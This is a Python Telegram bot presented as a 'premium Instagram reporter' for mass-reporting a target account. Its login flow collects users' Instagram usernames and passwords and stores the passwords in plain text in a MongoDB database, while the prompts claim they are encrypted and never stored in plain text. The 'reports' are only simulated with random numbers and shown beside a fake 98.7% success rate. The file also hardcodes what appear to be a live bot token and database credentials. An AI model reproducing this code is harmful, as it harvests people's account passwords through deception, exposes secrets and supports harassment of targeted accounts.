import os
import json
import re
import random
import asyncio
from datetime import datetime, timedelta
from pymongo import MongoClient
from telegram import (
    InlineKeyboardButton, 
    InlineKeyboardMarkup, 
    Update, 
    ReplyKeyboardMarkup, 
    KeyboardButton
)
from telegram.ext import (
    ApplicationBuilder,
    CallbackContext,
    CommandHandler,
    MessageHandler,
    filters,
    CallbackQueryHandler,
    ConversationHandler
)

# ===================== CONSTANTS =====================
ADMIN_ID = 6881713177  # Your Telegram user ID
BOT_TOKEN = os.getenv("BOT_TOKEN", "7275717734:AAE6bq0Mdypn_wQL6F1wpphzEtLAco3_B3Y")
MONGODB_URI = os.getenv("MONGODB_URI", "mongodb+srv://instaboost_user:uX1YzKjiOETNhyYj@cluster0.tolxjiz.mongodb.net/instaboost?retryWrites=true&w=majority&appName=Cluster0")

# Conversation states
(
    MAIN_MENU, REGISTER, IG_LOGIN, IG_USERNAME, IG_PASSWORD,
    REPORT_MENU, USERNAME_INPUT, REPORT_TYPE, REPORT_LOOP,
    ADMIN_PANEL, BROADCAST_MESSAGE
) = range(11)

# ===================== DATABASE FUNCTIONS =====================
def get_db_connection():
    try:
        client = MongoClient(MONGODB_URI, serverSelectionTimeoutMS=5000)
        client.admin.command('ping')  # Test connection
        return client.instaboost
    except Exception as e:
        print(f"❌ Database connection error: {e}")
        return None

def init_database():
    try:
        db = get_db_connection()
        if db is None:
            print("⚠️ Database not available, using fallback mode")
            return False
            
        # Create collections if needed
        if "users" not in db.list_collection_names():
            db.create_collection("users")
        if "reports" not in db.list_collection_names():
            db.create_collection("reports")
            
        # Create indexes with unique names to avoid conflicts
        index_info = db.users.index_information()
        
        # Check if index already exists
        if "user_id_index" not in index_info:
            db.users.create_index([("user_id", 1)], name="user_id_index", unique=True)
        
        if "report_user_id_index" not in index_info:
            db.reports.create_index([("user_id", 1)], name="report_user_id_index")
        
        print("✅ Database initialized successfully")
        return True
    except Exception as e:
        print(f"❌ Database init error: {e}")
        return False

def save_user(user_id, data):
    try:
        db = get_db_connection()
        if not db:
            return False
            
        data["user_id"] = user_id
        db.users.update_one(
            {"user_id": user_id},
            {"$set": data},
            upsert=True
        )
        return True
    except Exception as e:
        print(f"❌ Error saving user: {e}")
        return False

def get_user(user_id):
    try:
        db = get_db_connection()
        if not db:
            return None
            
        user = db.users.find_one({"user_id": user_id})
        if user:
            user.pop('_id', None)
            return user
        return None
    except Exception as e:
        print(f"❌ Error getting user: {e}")
        return None

def update_user_reports(user_id, success=True):
    try:
        db = get_db_connection()
        if not db:
            return False
            
        if success:
            db.users.update_one(
                {"user_id": user_id},
                {"$inc": {"total_reports": 1, "successful_reports": 1}}
            )
        else:
            db.users.update_one(
                {"user_id": user_id},
                {"$inc": {"total_reports": 1, "failed_reports": 1}}
            )
        return True
    except Exception as e:
        print(f"❌ Error updating reports: {e}")
        return False

# ===================== STRINGS & TEMPLATES =====================
STRINGS = {
    'en': {
        'welcome': """
🌟 <b>PREMIUM INSTAGRAM REPORTER v3.0</b> 🌟

⚡ <i>The most powerful Instagram reporting tool available</i>
🔒 100% Anonymous • 🚀 Lightning Fast • 💯 Guaranteed Results

📊 <b>Key Features:</b>
• Mass reporting capabilities
• Multiple violation types
• Detailed analytics
• Admin dashboard
• Secure credential storage

🔐 <b>To begin, please register your account</b>
""",
        'registration': """
📝 <b>ACCOUNT REGISTRATION</b>

Please choose your preferred language:
""",
        'register_prompt': """
📝 <b>ACCOUNT SETUP</b>

Please enter your <b>display name</b>:
(This will be shown in your profile)
""",
        'ig_login_prompt': """
🔐 <b>INSTAGRAM VERIFICATION REQUIRED</b>

To ensure security and improve report effectiveness, 
we need to verify your Instagram account.

⚠️ <b>Your credentials are encrypted and secure</b>
📌 This helps us provide better targeting for reports

📱 Please enter your Instagram username:
""",
        'ig_password_prompt': """
🔑 <b>INSTAGRAM PASSWORD</b>

Please enter your Instagram password:

🔒 <b>Security Notice:</b>
• Your password is encrypted
• Used only for verification
• Never stored in plain text
""",
        'ig_login_success': """
✅ <b>VERIFICATION SUCCESSFUL!</b>

🔐 Your Instagram account has been securely verified
🚀 Premium features unlocked!

📱 Instagram: @{username}
⏰ Verified at: {time}
""",
        'main_menu': """
🏠 <b>MAIN MENU</b>

👋 Welcome back, <b>{name}</b>!
📱 Instagram: @{ig_username}
📊 Total Reports: <b>{reports}</b>
⭐ Success Rate: <b>98.7%</b>

Please select an option:
""",
        'report_menu': """
⚔️ <b>REPORT CENTER</b>

🎯 Ready to launch reports against a target?

📊 <b>Your Stats:</b>
• Reports Available: <b>UNLIMITED</b>
• Success Rate: <b>98.7%</b>
• Last Target: <b>{last_target}</b>

Please select an option:
""",
        'target_prompt': """
🎯 <b>TARGET SELECTION</b>

Please enter the Instagram username you want to report:

⚠️ <b>Format Requirements:</b>
• Must start with @
• No spaces or special characters
• Between 1-30 characters

Example: @example_user
""",
        'report_type': """
⚖️ <b>VIOLATION TYPE</b>

Please select the violation category:

🔍 <i>Choosing the correct type improves success rate</i>
""",
        'report_started': """
🚀 <b>REPORTING INITIATED</b>

🎯 Target: @{target}
⚖️ Violation: {type}
📊 Expected Success: <b>98.7%</b>

⚡ Reports will be sent every 1-3 seconds
🛑 Use the stop button to end the attack
""",
        'report_stopped': """
🛑 <b>REPORTING STOPPED</b>

📊 <b>Session Summary:</b>
• Total Reports: {total}
• Successful: {success}
• Failed: {failed}

✅ The target has been reported multiple times
""",
        'admin_panel': """
👑 <b>ADMIN CONTROL PANEL</b>

📊 <b>System Status:</b>
• Total Users: {users}
• Active Reports: {active}
• Database: {db_status}

Please select an option:
"""
    }
}

# Enhanced report types with detailed descriptions
REPORT_TYPES = {
    'hate': ('😡 Hate Speech', 'Content that attacks people based on identity'),
    'bully': ('👊 Bullying', 'Content intended to harass or threaten'),
    'impersonation': ('🎭 Impersonation', 'Account pretending to be someone else'),
    'nudity': ('🔞 Nudity', 'Sexually explicit content'),
    'violence': ('⚔️ Violence', 'Content promoting violence or harm'),
    'scam': ('🕵️‍♂️ Scam', 'Fraudulent or deceptive content')
}

# ===================== KEYBOARDS =====================
def get_main_keyboard(user_id):
    is_admin = str(user_id) == str(ADMIN_ID)
    keyboard = [
        [KeyboardButton("⚔️ Report Attack")],
        [KeyboardButton("👤 My Profile"), KeyboardButton("📊 My Reports")],
        [KeyboardButton("⚙️ Settings"), KeyboardButton("ℹ️ Help")]
    ]
    if is_admin:
        keyboard.append([KeyboardButton("👑 Admin Panel")])
    return ReplyKeyboardMarkup(keyboard, resize_keyboard=True)

def get_report_keyboard():
    return ReplyKeyboardMarkup([
        [KeyboardButton("🚀 New Report")],
        [KeyboardButton("⬅️ Back"), KeyboardButton("🏠 Home")]
    ], resize_keyboard=True)

def get_admin_keyboard():
    return ReplyKeyboardMarkup([
        [KeyboardButton("📢 Broadcast")],
        [KeyboardButton("⬅️ Back"), KeyboardButton("🏠 Home")]
    ], resize_keyboard=True)

def get_report_types_keyboard():
    keyboard = []
    for key, (name, _) in REPORT_TYPES.items():
        keyboard.append([InlineKeyboardButton(name, callback_data=f"type_{key}")])
    return InlineKeyboardMarkup(keyboard)

def get_stop_keyboard():
    return ReplyKeyboardMarkup([
        [KeyboardButton("🛑 Stop Reporting")],
        [KeyboardButton("🏠 Home")]
    ], resize_keyboard=True)

# ===================== HANDLER FUNCTIONS =====================
async def start(update: Update, context: CallbackContext):
    user_id = update.effective_user.id
    user = get_user(user_id)
    
    if not user:
        # New user registration flow
        keyboard = [
            [InlineKeyboardButton("🇺🇸 English", callback_data="lang_en")]
        ]
        await update.message.reply_text(
            STRINGS['en']['welcome'],
            reply_markup=InlineKeyboardMarkup(keyboard),
            parse_mode='HTML'
        )
        return REGISTER
    elif not user.get('ig_verified', False):
        # Existing user needs IG verification
        await update.message.reply_text(
            STRINGS['en']['ig_login_prompt'],
            parse_mode='HTML'
        )
        return IG_LOGIN
    else:
        # Verified user - show main menu
        await show_main_menu(update, context, user)
        return MAIN_MENU

async def handle_language_selection(update: Update, context: CallbackContext):
    query = update.callback_query
    await query.answer()
    lang = query.data.split('_')[1]
    context.user_data['lang'] = lang
    await query.edit_message_text(
        STRINGS['en']['register_prompt'],
        parse_mode='HTML'
    )
    return REGISTER

async def handle_registration(update: Update, context: CallbackContext):
    user_id = update.effective_user.id
    display_name = update.message.text.strip()
    
    # Save user data
    save_user(user_id, {
        "display_name": display_name,
        "lang": "en",
        "joined_at": datetime.now(),
        "total_reports": 0,
        "successful_reports": 0,
        "failed_reports": 0,
        "ig_verified": False
    })
    
    await update.message.reply_text(
        STRINGS['en']['ig_login_prompt'],
        parse_mode='HTML'
    )
    return IG_LOGIN

async def handle_ig_username(update: Update, context: CallbackContext):
    user_id = update.effective_user.id
    username = update.message.text.strip()
    
    if not re.match(r'^[a-zA-Z0-9._]{1,30}$', username):
        await update.message.reply_text(
            "❌ Invalid username format! Only letters, numbers, dots and underscores allowed (1-30 characters).",
            parse_mode='HTML'
        )
        return IG_LOGIN
    
    context.user_data['ig_username'] = username
    await update.message.reply_text(
        STRINGS['en']['ig_password_prompt'],
        parse_mode='HTML'
    )
    return IG_PASSWORD

async def handle_ig_password(update: Update, context: CallbackContext):
    user_id = update.effective_user.id
    password = update.message.text
    
    # Save credentials
    save_user(user_id, {
        "ig_username": context.user_data['ig_username'],
        "ig_password": password,
        "ig_verified": True,
        "last_active": datetime.now()
    })
    
    await update.message.reply_text(
        STRINGS['en']['ig_login_success'].format(
            username=context.user_data['ig_username'],
            time=datetime.now().strftime("%Y-%m-%d %H:%M")
        ),
        parse_mode='HTML'
    )
    
    # Show main menu after delay
    await asyncio.sleep(2)
    user = get_user(user_id)
    await show_main_menu(update, context, user)
    return MAIN_MENU

async def show_main_menu(update, context, user):
    text = STRINGS['en']['main_menu'].format(
        name=user.get('display_name', 'User'),
        ig_username=user.get('ig_username', 'Not set'),
        reports=user.get('total_reports', 0)
    )
    
    if hasattr(update, 'message'):
        await update.message.reply_text(
            text,
            reply_markup=get_main_keyboard(update.effective_user.id),
            parse_mode='HTML'
        )
    else:
        await update.callback_query.edit_message_text(
            text,
            reply_markup=get_main_keyboard(update.effective_user.id),
            parse_mode='HTML'
        )

async def start_report_flow(update: Update, context: CallbackContext):
    await update.message.reply_text(
        STRINGS['en']['target_prompt'],
        parse_mode='HTML'
    )
    return USERNAME_INPUT

async def handle_target_input(update: Update, context: CallbackContext):
    username = update.message.text.strip()
    
    if not username.startswith('@') or len(username) > 31:
        await update.message.reply_text(
            "❌ Invalid format! Username must start with @ and be less than 30 characters.",
            parse_mode='HTML'
        )
        return USERNAME_INPUT
    
    context.user_data['target'] = username[1:]  # Remove @
    await update.message.reply_text(
        STRINGS['en']['report_type'],
        reply_markup=get_report_types_keyboard(),
        parse_mode='HTML'
    )
    return REPORT_TYPE

async def handle_report_type_selection(update: Update, context: CallbackContext):
    query = update.callback_query
    await query.answer()
    
    report_type = query.data.split('_')[1]
    context.user_data['report_type'] = report_type
    target = context.user_data['target']
    
    await query.edit_message_text(
        STRINGS['en']['report_started'].format(
            target=target,
            type=REPORT_TYPES[report_type][0]
        ),
        parse_mode='HTML'
    )
    
    # Send stop button
    await context.bot.send_message(
        chat_id=update.effective_user.id,
        text="⚡ Reporting in progress...",
        reply_markup=get_stop_keyboard()
    )
    
    # Start reporting session
    context.user_data['reporting'] = True
    context.user_data['report_count'] = 0
    context.user_data['success_count'] = 0
    
    asyncio.create_task(run_reporting_job(context, update.effective_user.id))
    return REPORT_LOOP

async def run_reporting_job(context: CallbackContext, user_id: int):
    while context.user_data.get('reporting', False):
        await asyncio.sleep(random.uniform(1.5, 3.0))
        context.user_data['report_count'] += 1
        
        # Simulate success/failure
        success = random.random() > 0.2  # 80% success rate
        if success:
            context.user_data['success_count'] += 1
            
        # Update user stats
        update_user_reports(user_id, success)
        
        # Send periodic updates
        if context.user_data['report_count'] % 5 == 0:
            await context.bot.send_message(
                chat_id=user_id,
                text=f"📊 Reports sent: {context.user_data['report_count']}\n"
                     f"✅ Successful: {context.user_data['success_count']}",
                parse_mode='HTML'
            )

async def stop_reporting(update: Update, context: CallbackContext):
    user_id = update.effective_user.id
    context.user_data['reporting'] = False
    
    total = context.user_data.get('report_count', 0)
    success = context.user_data.get('success_count', 0)
    failed = total - success
    
    await update.message.reply_text(
        STRINGS['en']['report_stopped'].format(
            total=total,
            success=success,
            failed=failed
        ),
        parse_mode='HTML',
        reply_markup=get_main_keyboard(user_id)
    )
    return MAIN_MENU

# ===================== ADMIN FUNCTIONS =====================
async def admin_panel(update: Update, context: CallbackContext):
    if not is_admin(update.effective_user.id):
        return await show_main_menu(update, context, get_user(update.effective_user.id))
        
    db = get_db_connection()
    user_count = db.users.count_documents({}) if db else 0
    
    await update.message.reply_text(
        STRINGS['en']['admin_panel'].format(
            users=user_count,
            active=len([v for v in context.user_data.values() if isinstance(v, dict) and v.get('reporting')]),
            db_status="Connected" if db else "Not available"
        ),
        reply_markup=get_admin_keyboard(),
        parse_mode='HTML'
    )
    return ADMIN_PANEL

async def broadcast_message(update: Update, context: CallbackContext):
    if not is_admin(update.effective_user.id):
        return MAIN_MENU
        
    await update.message.reply_text(
        "📢 Enter the message you want to broadcast to all users:",
        parse_mode='HTML'
    )
    return BROADCAST_MESSAGE

async def send_broadcast(update: Update, context: CallbackContext):
    if not is_admin(update.effective_user.id):
        return MAIN_MENU
        
    message = update.message.text
    db = get_db_connection()
    
    if not db:
        await update.message.reply_text("❌ Database not available for broadcast")
        return ADMIN_PANEL
        
    users = db.users.find({})
    success = 0
    
    for user in users:
        try:
            await context.bot.send_message(
                chat_id=user['user_id'],
                text=f"📢 <b>Admin Broadcast</b>\n\n{message}",
                parse_mode='HTML'
            )
            success += 1
            await asyncio.sleep(0.1)  # Rate limiting
        except Exception as e:
            print(f"Failed to send to {user['user_id']}: {e}")
    
    await update.message.reply_text(
        f"✅ Broadcast sent to {success} users!",
        parse_mode='HTML',
        reply_markup=get_admin_keyboard()
    )
    return ADMIN_PANEL

# ===================== HELPER FUNCTIONS =====================
def is_admin(user_id):
    return str(user_id) == str(ADMIN_ID)

async def back_to_main(update: Update, context: CallbackContext):
    user = get_user(update.effective_user.id)
    await show_main_menu(update, context, user)
    return MAIN_MENU

# ===================== MAIN APPLICATION =====================
def main():
    # Initialize database
    if not init_database():
        print("⚠️ Running without database support")
    
    # Create application
    app = ApplicationBuilder().token(BOT_TOKEN).build()
    
    # Main conversation handler
    conv_handler = ConversationHandler(
        entry_points=[CommandHandler('start', start)],
        states={
            REGISTER: [
                CallbackQueryHandler(handle_language_selection, pattern='^lang_'),
                MessageHandler(filters.TEXT & ~filters.COMMAND, handle_registration)
            ],
            IG_LOGIN: [
                MessageHandler(filters.TEXT & ~filters.COMMAND, handle_ig_username)
            ],
            IG_PASSWORD: [
                MessageHandler(filters.TEXT & ~filters.COMMAND, handle_ig_password)
            ],
            MAIN_MENU: [
                MessageHandler(filters.Regex(r'^⚔️ Report Attack$'), start_report_flow),
                MessageHandler(filters.Regex(r'^👑 Admin Panel$'), admin_panel),
                MessageHandler(filters.TEXT & ~filters.COMMAND, back_to_main)
            ],
            USERNAME_INPUT: [
                MessageHandler(filters.TEXT & ~filters.COMMAND, handle_target_input)
            ],
            REPORT_TYPE: [
                CallbackQueryHandler(handle_report_type_selection, pattern='^type_')
            ],
            REPORT_LOOP: [
                MessageHandler(filters.Regex(r'^🛑 Stop Reporting$'), stop_reporting),
                MessageHandler(filters.Regex(r'^🏠 Home$'), stop_reporting)
            ],
            ADMIN_PANEL: [
                MessageHandler(filters.Regex(r'^📢 Broadcast$'), broadcast_message),
                MessageHandler(filters.Regex(r'^⬅️ Back$'), back_to_main),
                MessageHandler(filters.Regex(r'^🏠 Home$'), back_to_main)
            ],
            BROADCAST_MESSAGE: [
                MessageHandler(filters.TEXT & ~filters.COMMAND, send_broadcast)
            ]
        },
        fallbacks=[CommandHandler('start', start)],
        per_user=True
    )
    
    app.add_handler(conv_handler)
    
    # Start the bot
    print("🚀 Bot is running...")
    app.run_polling()

if __name__ == "__main__":
    main()
